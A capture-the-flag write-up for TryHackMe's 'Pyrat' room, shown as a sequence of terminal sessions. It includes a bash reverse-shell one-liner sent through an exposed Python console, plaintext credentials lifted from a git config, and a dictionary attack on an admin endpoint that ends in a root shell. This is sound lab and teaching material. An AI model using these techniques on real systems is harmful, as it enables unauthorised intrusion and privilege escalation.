# Target
| Category          | Details                                   |
|-------------------|-------------------------------------------|
| 📝 **Name**       | [Pyrat](https://tryhackme.com/room/pyrat) |  
| 🏷 **Type**       | THM Challenge                             |
| 🖥 **OS**         | Linux                                     |
| 🎯 **Difficulty** | Easy                                      |
| 📁 **Tags**       | Python, git, telnet                       |

# Scan
```
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 2a:f7:e5:84:b4:64:08:aa:81:7e:cf:2d:2e:76:d3:7b (RSA)
|   256 39:35:1b:3b:61:d8:a9:09:2f:32:57:2e:51:13:c1:71 (ECDSA)
|_  256 16:4b:50:71:24:05:58:45:23:35:e5:b2:7a:5d:61:c6 (ED25519)
8000/tcp open  http-alt
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-open-proxy: Proxy might be redirecting requests
```

# Attack path
1. [Gain initial foothold by spawning reverse shell connection using unsecured Python console](#gain-initial-foothold-by-spawning-reverse-shell-connection-using-unsecured-python-console)
2. [Escalate to `think` user using reused credentials discovered in git configuration file](#escalate-to-think-user-using-reused-credentials-discovered-in-git-configuration-file)
3. [Escalate to `root` user by spawning root shell using Python console](#escalate-to-root-user-by-spawning-root-shell-using-python-console)

### Gain initial foothold by spawning reverse shell connection using unsecured Python console

#### Access target using `curl` 
```
┌──(magicrc㉿perun)-[~/attack/THM Pyrat]
└─$ curl http://$TARGET:8000                                                            
Try a more basic connection
```
Given hint suggests connection using `telnet` or `nc`.

#### Access target using `telnet`
```
┌──(magicrc㉿perun)-[~/attack/THM Pyrat]
└─$ telnet $TARGET 8000
Trying 10.82.133.218...
Connected to 10.82.133.218.
Escape character is '^]'.
test
name 'test' is not defined
help

.
invalid syntax (<string>, line 1)
'
EOL while scanning string literal (<string>, line 1)
print('test')
test

print(f"Python test: {7*7}")
Python test: 49
```
Simple 'blind' enumeration suggest some kind of Python console in place. 

#### Start `netcat` to listen for reverse shell
```
┌──(magicrc㉿perun)-[~/attack/THM Pyrat]
└─$ nc -lvp 4444 
listening on [any] 4444 ...
```

#### Spawn reverse shell using `os.system` command
```
┌──(magicrc㉿perun)-[~/attack/THM Pyrat]
└─$ echo "os.system(\"/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'\")" | nc $TARGET 8000
```

#### Confirm foothold gained
```
10.82.133.218: inverse host lookup failed: Unknown host
connect to [192.168.132.170] from (UNKNOWN) [10.82.133.218] 42106
bash: cannot set terminal process group (733): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
www-data@ip-10-82-133-218:~$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Escalate to `think` user using reused credentials discovered in git configuration file

#### Discover credentials in git configuration file
```
www-data@ip-10-82-133-218:/$ cat /opt/dev/.git/config
cat /opt/dev/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_
```

#### Confirm escalation with gaining access over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Pyrat]
└─$ ssh think@$TARGET      
<SNIP>
think@ip-10-82-133-218:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

### Escalate to `root` user by spawning root shell using Python console

#### Browse through git history of `opt/dev`
```
think@ip-10-82-133-218:/opt/dev$ git show
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

diff --git a/pyrat.py.old b/pyrat.py.old
new file mode 100644
index 0000000..ce425cf
--- /dev/null
+++ b/pyrat.py.old
@@ -0,0 +1,27 @@
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+...............................................
```
This Python code suggests that there hidden functionality for `some_endpoint` command / endpoint.

#### Send `some_endpoint` command
```
┌──(magicrc㉿perun)-[~/attack/THM Pyrat]
└─$ telnet $TARGET 8000
Trying 10.82.173.46...
Connected to 10.82.173.46.
Escape character is '^]'.
some_endpoint
name 'some_endpoint' is not defined
```
As this does not yield any result, we could enumerate with custom script.

#### Use `/usr/share/wordlists/dirb/common.txt` to enumerate endpoints
```
┌──(thm)─(magicrc㉿perun)-[~/attack/THM Pyrat]
└─$ python3 enumerate_endpoints.py $TARGET 8000 /usr/share/wordlists/dirb/common.txt
[+] Opening connection to 10.82.133.218 on port 8000: Done
[+] Enumerating endpoints...
[*] admin -> Start a fresh client to begin.
```

#### Check `admin` endpoint 
```
┌──(magicrc㉿perun)-[~/attack/THM Pyrat]
└─$ telnet $TARGET 8000
Trying 10.82.173.46...
Connected to 10.82.173.46.
Escape character is '^]'.
admin
Password:
```
`admin` endpoint seems to be password protected, we will use another custom script for dictionary attack.

#### Use `rockyou.txt` for dictionary attack
```
┌──(thm)─(magicrc㉿perun)-[~/attack/THM Pyrat]
└─$ python3 admin_endpoint_dictionary_attack.py $TARGET 8000 /usr/share/wordlists/rockyou.txt
[+] Opening connection to 10.82.173.46 on port 8000: Done
[+] Checking password [pass]...
[+] Checking password [123456]...
[+] Checking password [12345]...
[+] Checking password [123456789]...
[+] Checking password [password]...
[+] Checking password [iloveyou]...
[+] Checking password [princess]...
[+] Checking password [1234567]...
[+] Checking password [rockyou]...
[+] Checking password [12345678]...
[+] Checking password [abc123]...
[+] Password found: [abc123]
[*] Closed connection to 10.82.173.46 port 8000
```

#### Use discovered endpoint and password to spawn root shell
```
┌──(thm)─(magicrc㉿perun)-[~/…/ctf-writeups/THM/Easy/Pyrat]
└─$ telnet $TARGET 8000
Trying 10.82.173.46...
Connected to 10.82.173.46.
Escape character is '^]'.
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# id
id

uid=0(root) gid=0(root) groups=0(root)
```